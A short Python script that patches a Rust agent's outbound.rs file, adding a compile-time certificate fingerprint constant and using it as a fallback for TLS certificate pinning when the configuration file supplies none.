with open("agent/src/outbound.rs", "r") as f:
    content = f.read()

# Look for BAKED constants and add cert fp
new_constants = """// Compile-time constants injected by the Builder (may be absent in manual builds).
const BAKED_ADDR: Option<&str> = option_env!("ORCHESTRA_C_ADDR");
const BAKED_SECRET: Option<&str> = option_env!("ORCHESTRA_C_SECRET");
const BAKED_CERT_FP: Option<&str> = option_env!("ORCHESTRA_C_CERT_FP");
"""

content = content.replace("""// Compile-time constants injected by the Builder (may be absent in manual builds).
const BAKED_ADDR: Option<&str> = option_env!("ORCHESTRA_C_ADDR");
const BAKED_SECRET: Option<&str> = option_env!("ORCHESTRA_C_SECRET");""", new_constants)

fp_logic_old = """    let tls_config: rustls::ClientConfig = {
        let cfg = crate::config::load_config()?;
        if let Some(fp) = cfg.server_cert_fingerprint {"""

fp_logic_new = """    let tls_config: rustls::ClientConfig = {
        let cfg = crate::config::load_config()?;
        let fingerprint = cfg.server_cert_fingerprint.or_else(|| BAKED_CERT_FP.map(|s| s.to_string()));
        if let Some(fp) = fingerprint {"""

content = content.replace(fp_logic_old, fp_logic_new)

with open("agent/src/outbound.rs", "w") as f:
    f.write(content)
